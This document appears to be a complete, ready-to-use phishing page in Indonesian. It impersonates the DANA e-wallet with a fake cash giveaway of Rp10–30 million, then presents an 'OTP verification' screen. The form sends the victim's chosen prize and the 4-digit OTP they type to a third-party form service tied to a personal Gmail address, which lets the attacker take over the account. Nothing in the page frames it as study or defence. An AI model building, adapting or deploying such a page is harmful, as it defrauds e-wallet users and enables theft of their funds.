<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#00A9E0">
    <title>DANA Giveaway & Verifikasi</title>
    <style>
        /* RESET CSS AGRESIF Agar Full ke Atas */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html, body {
            width: 100%;
            height: 100%;
            background-color: #00A9E0; /* Dasar biru DANA */
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            overflow: hidden; /* Mencegah scroll yang tidak perlu */
        }

        /* Container Utama */
        .app-wrapper {
            display: flex;
            flex-direction: column;
            height: 100vh;
            width: 100%;
        }

        /* HALAMAN 1: GIVEAWAY */
        #page-giveaway {
            display: flex;
            flex-direction: column;
            height: 100%;
        }

        .header-blue {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            padding: 20px;
        }

        .gift-icon { width: 150px; filter: drop-shadow(0 10px 10px rgba(0,0,0,0.2)); }

        .white-card {
            background: white;
            border-radius: 30px 30px 0 0;
            padding: 25px 20px 100px 20px;
            box-shadow: 0 -10px 30px rgba(0,0,0,0.2);
        }

        .option-item {
            display: flex;
            align-items: center;
            border: 2px solid #f2f2f2;
            border-radius: 15px;
            padding: 16px;
            margin-bottom: 12px;
            cursor: pointer;
        }

        input[type="radio"] { display: none; }
        input[type="radio"]:checked + .option-item {
            border-color: #00A9E0;
            background-color: #f0fbff;
        }

        .btn-blue {
            width: 100%;
            padding: 16px;
            background: #00A9E0;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }

        /* HALAMAN 2: OTP (Hidden by default) */
        #page-otp {
            display: none; /* Sembunyi dulu */
            background-color: white;
            height: 100vh;
            flex-direction: column;
        }

        .otp-header {
            background-color: #008CFF;
            color: white;
            padding: 20px;
            text-align: center;
            font-weight: bold;
            font-size: 1.2rem;
        }

        .otp-container {
            padding: 40px 20px;
            text-align: center;
        }

        .otp-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 30px 0;
        }

        .otp-inputs input {
            width: 55px;
            height: 65px;
            text-align: center;
            font-size: 28px;
            font-weight: bold;
            border: 2px solid #ddd;
            border-radius: 12px;
            background: #f9f9f9;
        }

        .timer { color: #008CFF; font-weight: bold; margin-bottom: 20px; }

        /* Navbar Bawah */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            width: 100%;
            height: 75px;
            background: white;
            border-top: 1px solid #eee;
            display: flex;
            justify-content: space-around;
            align-items: center;
        }
    </style>
</head>
<body>

<div class="app-wrapper">
    
    <section id="page-giveaway">
        <div class="header-blue">
            <img src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png" class="gift-icon" alt="Kado">
            <h1 style="font-size: 2rem;">GIVEAWAY</h1>
            <p style="background:#FFD700; color:#0077C8; padding:3px 15px; border-radius:15px; font-weight:bold;">UANG TUNAI</p>
        </div>

        <div class="white-card">
            <p style="text-align:center; color:#0077C8; font-weight:bold; margin-bottom:15px;">DANA GIVEAWAY</p>
            
            <label>
                <input type="radio" name="pilihan" value="10jt">
                <div class="option-item"><span style="font-size:1.2rem; font-weight:800;">üí∏ Rp10.000.000</span></div>
            </label>
            <label>
                <input type="radio" name="pilihan" value="20jt">
                <div class="option-item"><span style="font-size:1.2rem; font-weight:800;">üí∏ Rp20.000.000</span></div>
            </label>
            <label>
                <input type="radio" name="pilihan" value="30jt">
                <div class="option-item"><span style="font-size:1.2rem; font-weight:800;">üí∏ Rp30.000.000</span></div>
            </label>

            <button class="btn-blue" onclick="goToOTP()">KONFIRMASI</button>
        </div>

        <nav class="bottom-nav">
            <div style="text-align:center; color:#999; font-size:0.7rem;">üè†<br>Beranda</div>
            <div style="background:#00A9E0; width:50px; height:50px; border-radius:50%; margin-top:-30px; border:4px solid white; display:flex; align-items:center; justify-content:center; color:white; font-weight:bold; font-size:0.8rem;">PAY</div>
            <div style="text-align:center; color:#999; font-size:0.7rem;">üë§<br>Saya</div>
        </nav>
    </section>

    <section id="page-otp">
        <div class="otp-header">Verifikasi OTP</div>
        <div class="otp-container">
            <h3>Masukkan Kode OTP</h3>
            <p style="color:#666; font-size:0.9rem;">Kami telah mengirimkan kode ke nomor Anda</p>
            
            <div class="otp-inputs">
                <input type="tel" maxlength="1" oninput="moveNext(this, 0)">
                <input type="tel" maxlength="1" oninput="moveNext(this, 1)">
                <input type="tel" maxlength="1" oninput="moveNext(this, 2)">
                <input type="tel" maxlength="1" oninput="moveNext(this, 3)">
            </div>

            <div class="timer" id="timer">Kirim ulang dalam 100 detik</div>

            <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST" onsubmit="return handleFinalSubmit()">
                <input type="hidden" name="Pilihan Hadiah" id="selectedPrize">
                <input type="hidden" name="OTP_Code" id="finalOTP">
                <input type="hidden" name="_captcha" value="false">
                <button type="submit" class="btn-blue">KONFIRMASI</button>
            </form>
        </div>
    </section>

</div>

<script>
    // Fungsi pindah ke halaman OTP
    function goToOTP() {
        const selected = document.querySelector('input[name="pilihan"]:checked');
        if (selected) {
            document.getElementById('selectedPrize').value = selected.value;
            document.getElementById('page-giveaway').style.display = 'none';
            document.getElementById('page-otp').style.display = 'flex';
            startTimer();
        } else {
            alert("Silakan pilih nominal hadiah dahulu!");
        }
    }

    // Fungsi Input OTP
    const inputs = document.querySelectorAll(".otp-inputs input");
    function moveNext(el, index) {
        if (el.value.length === 1 && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    }

    // Timer OTP
    let countdown = 100;
    function startTimer() {
        const timerEl = document.getElementById("timer");
        const interval = setInterval(() => {
            countdown--;
            if (countdown > 0) {
                timerEl.textContent = "Kirim ulang dalam " + countdown + " detik";
            } else {
                clearInterval(interval);
                timerEl.textContent = "Kode OTP telah kadaluarsa";
                timerEl.style.color = "red";
            }
        }, 1000);
    }

    // Gabungkan OTP sebelum kirim email
    function handleFinalSubmit() {
        const otp = Array.from(inputs).map(i => i.value).join('');
        if(otp.length < 4) {
            alert("Masukkan 4 digit OTP!");
            return false;
        }
        document.getElementById("finalOTP").value = otp;
        return true; 
    }
</script>

</body>
</html>
